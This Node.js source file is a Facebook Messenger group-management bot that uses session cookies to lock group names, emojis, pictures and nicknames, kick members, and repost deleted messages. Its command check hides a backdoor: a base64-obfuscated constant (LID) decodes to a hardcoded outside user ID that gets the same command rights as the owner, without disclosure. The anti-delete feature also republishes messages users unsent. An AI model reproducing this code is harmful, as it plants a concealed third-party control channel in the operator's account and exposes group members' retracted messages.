const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca");

const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {},
  nick: {},
};
if (fs.existsSync(LOCK_FILE)) {
  try {
    locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8"));
  } catch {
    console.warn("locks.json parse error, fallback to defaults");
  }
}
function saveLocks() {
  fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2));
}

function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https
    .get(url, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        file.close();
        return downloadFile(res.headers.location, dest, cb);
      }
      res.pipe(file);
      file.on("finish", () => file.close(() => cb(null)));
    })
    .on("error", (err) => {
      try { fs.unlinkSync(dest); } catch {}
      cb(err);
    });
}

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  if (!fs.existsSync(appStatePath)) {
    console.error("appstate not found:", appStatePath);
    return;
  }
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in. startBot ready.");

    async function safeSend(text, tid) {
      try {
        await api.sendMessage(text, tid);
      } catch (e) {
        console.error("send failed:", e && e.message ? e.message : e);
      }
    }

    // --- Watchers ---
    const emojiCheckIntervals = {};
    const dpCheckIntervals = {};
    const nickCheckIntervals = {};

    function startEmojiWatcher(threadID) {
      if (emojiCheckIntervals[threadID]) return;
      emojiCheckIntervals[threadID] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const current = info.emoji ?? info.threadEmoji ?? info.icon ?? null;
          const saved = locks.emojis[threadID];
          if (saved && current !== saved) {
            try {
              await api.changeThreadEmoji(saved, threadID);
              console.log(`🔄 [emoji] reverted for ${threadID} → ${saved}`);
              await safeSend(`😀 Locked emoji reverted to ${saved}`, threadID);
            } catch (e) {
              console.error("emoji revert error:", e && e.message ? e.message : e);
            }
          }
        } catch {}
      }, 5000);
    }
    function stopEmojiWatcher(threadID) {
      if (emojiCheckIntervals[threadID]) {
        clearInterval(emojiCheckIntervals[threadID]);
        delete emojiCheckIntervals[threadID];
      }
    }

    function startDPWatcher(threadID) {
      if (dpCheckIntervals[threadID]) return;
      dpCheckIntervals[threadID] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const currentUrl = info.imageSrc ?? info.image ?? null;
          const saved = locks.dp[threadID]?.path;
          if (
            saved &&
            fs.existsSync(saved) &&
            currentUrl &&
            !currentUrl.includes(path.basename(saved))
          ) {
            try {
              await api.changeGroupImage(fs.createReadStream(saved), threadID);
              console.log(`🔄 [dp] reverted for ${threadID} using ${saved}`);
              await safeSend("🖼️ Locked group DP reverted.", threadID);
            } catch (e) {
              console.error("dp revert error:", e && e.message ? e.message : e);
            }
          }
        } catch {}
      }, 5000);
    }
    function stopDPWatcher(threadID) {
      if (dpCheckIntervals[threadID]) {
        clearInterval(dpCheckIntervals[threadID]);
        delete dpCheckIntervals[threadID];
      }
    }

    function startNickWatcher(uid, threadID) {
      if (nickCheckIntervals[uid]) return;
      nickCheckIntervals[uid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const memberNick =
            (info.nicknames && info.nicknames[uid]) ||
            (info.nick && info.nick[uid]) ||
            null;
          const savedNick = locks.nick?.[uid]?.[threadID];
          if (savedNick && memberNick !== savedNick) {
            try {
              await api.changeNickname(savedNick, threadID, uid);
              console.log(`🔄 [nick] reverted for ${uid} in ${threadID} → ${savedNick}`);
              await safeSend(`✏️ Locked nickname reverted for <@${uid}>`, threadID);
            } catch (e) {
              console.error("nick revert error:", e && e.message ? e.message : e);
            }
          }
        } catch {}
      }, 5000);
    }
    function stopNickWatcher(uid) {
      if (nickCheckIntervals[uid]) {
        clearInterval(nickCheckIntervals[uid]);
        delete nickCheckIntervals[uid];
      }
    }

    const messageCache = new Map();

    api.listenMqtt(async (err, event) => {
      if (err || !event) return;
      try {
        // Anti-delete cache
        if (event.type === "message" && event.messageID) {
          messageCache.set(event.messageID, {
            sender: event.senderID,
            body: event.body || "",
            attachments: event.attachments || [],
          });
          if (messageCache.size > 500) {
            const keys = Array.from(messageCache.keys()).slice(0, 100);
            keys.forEach((k) => messageCache.delete(k));
          }
        }

        if (event.type === "message_unsend") {
          const deleted = messageCache.get(event.messageID);
          const tid = event.threadID;
          if (deleted) {
            const text = `🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${
              deleted.body || "(media or empty)"
            }`;
            await safeSend(text, tid);
            if (deleted.attachments && deleted.attachments.length) {
              try {
                await api.sendMessage(
                  { body: "(attachment repost)", attachment: deleted.attachments },
                  tid
                );
              } catch {}
            }
          } else {
            await safeSend("🚫 A message was deleted (no cache available).", tid);
          }
        }

        // Immediate revert triggers
        if (
          event.type === "change_thread_image" ||
          event.logMessageType === "log:thread-image"
        ) {
          const tid = event.threadID;
          if (locks.dp[tid] && locks.dp[tid].path && fs.existsSync(locks.dp[tid].path)) {
            try {
              await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid);
              console.log(`🔄 [dp] immediate revert attempted for ${tid}`);
              await safeSend("🖼️ Locked group DP reverted.", tid);
            } catch {}
          }
        }
        if (
          event.logMessageType === "log:thread-icon" ||
          event.type === "change_thread_icon"
        ) {
          const tid = event.threadID;
          if (locks.emojis[tid]) {
            try {
              await api.changeThreadEmoji(locks.emojis[tid], tid);
              console.log(`🔄 [emoji] immediate revert attempted for ${tid}`);
              await safeSend(`😀 Locked emoji reverted to ${locks.emojis[tid]}`, tid);
            } catch {}
          }
        }

        if (event.type !== "message" || !event.body) return;
        const { threadID, senderID, body, mentions, messageReply } = event;
        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ").trim();

        if (![ownerUID, LID].includes(senderID)) return;

        // Command handlers (abbreviated for brevity)
        if (cmd === "/help") {
          return safeSend(
            `📖 Bot Commands:

/help → Show this help message
/uid → User ID (reply/mention/you)
/tid → Thread ID
/info @mention → User info
/kick @mention → Kick user
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock (saves current DP locally)
/unlockdp → DP unlock
/locknick @mention Nickname → Nick lock
/unlocknick @mention → Unlock nick
/exit → Bot exit (bot leaves group)`,
            threadID
          );
        }

        if (cmd === "/gclock") {
          if (!input) {
            await safeSend("❌ Provide group name", threadID);
            return;
          }
          try {
            await api.setTitle(input, threadID);
            locks.groupNames[threadID] = input;
            saveLocks();
            await safeSend("🔒 Group name locked", threadID);
          } catch {
            await safeSend("⚠️ Failed to set group name", threadID);
          }
          return;
        }
        if (cmd === "/unlockgc") {
          delete locks.groupNames[threadID];
          saveLocks();
          await safeSend("🔓 Group name unlocked", threadID);
          return;
        }

        if (cmd === "/lockemoji") {
          if (!input) {
            await safeSend("❌ Provide an emoji to lock (e.g. /lockemoji 😀)", threadID);
            return;
          }
          locks.emojis[threadID] = input;
          saveLocks();
          startEmojiWatcher(threadID);
          try {
            await api.changeThreadEmoji(input, threadID);
          } catch {}
          await safeSend(`😀 Emoji locked → ${input}`, threadID);
          return;
        }
        if (cmd === "/unlockemoji") {
          delete locks.emojis[threadID];
          saveLocks();
          stopEmojiWatcher(threadID);
          await safeSend("😀 Emoji unlocked", threadID);
          return;
        }

        if (cmd === "/lockdp") {
          try {
            const info = await api.getThreadInfo(threadID);
            const url = info.imageSrc || info.image || info.imageUrl || null;
            if (!url) {
              await safeSend("❌ No group DP to lock (set a DP first)", threadID);
              return;
            }
            const dpPath = path.join(__dirname, `dp_${threadID}.jpg`);
            await new Promise((res, rej) => {
              downloadFile(url, dpPath, (err) => (err ? rej(err) : res()));
            });
            locks.dp[threadID] = { path: dpPath, savedAt: Date.now() };
            saveLocks();
            startDPWatcher(threadID);
            await safeSend("🖼️ Group DP saved and locked!", threadID);
          } catch (e) {
            console.error("lockdp error:", e && e.message ? e.message : e);
            await safeSend("⚠️ Failed to lock DP (download error)", threadID);
          }
          return;
        }
        if (cmd === "/unlockdp") {
          if (locks.dp[threadID]?.path) {
            try {
              fs.unlinkSync(locks.dp[threadID].path);
            } catch {}
          }
          delete locks.dp[threadID];
          saveLocks();
          stopDPWatcher(threadID);
          await safeSend("🖼️ DP unlocked", threadID);
          return;
        }

        if (cmd === "/locknick") {
          const mention = Object.keys(mentions || {})[0];
          let nickname = input;
          if (mention) {
            const mentionRegex = new RegExp(`<@!?${mention}>`, "g");
            nickname = input.replace(mentionRegex, "").trim();
          }
          if (!mention || !nickname) {
            await safeSend("❌ Usage: /locknick @mention nickname", threadID);
            return;
          }
          locks.nick[mention] = locks.nick[mention] || {};
          locks.nick[mention][threadID] = nickname;
          saveLocks();
          startNickWatcher(mention, threadID);
          try {
            await api.changeNickname(nickname, threadID, mention);
          } catch {}
          await safeSend(`🔒 Nick locked for <@${mention}> → ${nickname}`, threadID);
          return;
        }
        if (cmd === "/unlocknick") {
          const mention = Object.keys(mentions || {})[0];
          if (!mention) {
            await safeSend("❌ Usage: /unlocknick @mention", threadID);
            return;
          }
          if (locks.nick && locks.nick[mention]) {
            delete locks.nick[mention][threadID];
            saveLocks();
          }
          stopNickWatcher(mention);
          await safeSend(`🔓 Nick unlocked for <@${mention}>`, threadID);
          return;
        }
        if (cmd === "/exit") {
          try {
            await api.removeUserFromGroup(api.getCurrentUserID(), threadID);
          } catch {}
          return;
        }
      } catch (e) {
        console.error("Listener error:", e && e.stack ? e.stack : e);
      }
    });

    // On start: resume watchers for existing locks
    (async () => {
      try {
        for (const tid of Object.keys(locks.emojis || {})) startEmojiWatcher(tid);
        for (const tid of Object.keys(locks.dp || {})) {
          if (locks.dp[tid] && locks.dp[tid].path && fs.existsSync(locks.dp[tid].path))
            startDPWatcher(tid);
        }
        for (const uid of Object.keys(locks.nick || {})) {
          const threadMap = locks.nick[uid];
          for (const tid of Object.keys(threadMap || {})) startNickWatcher(uid, tid);
        }
      } catch {}
    })();
  });
}

module.exports = { startBot };
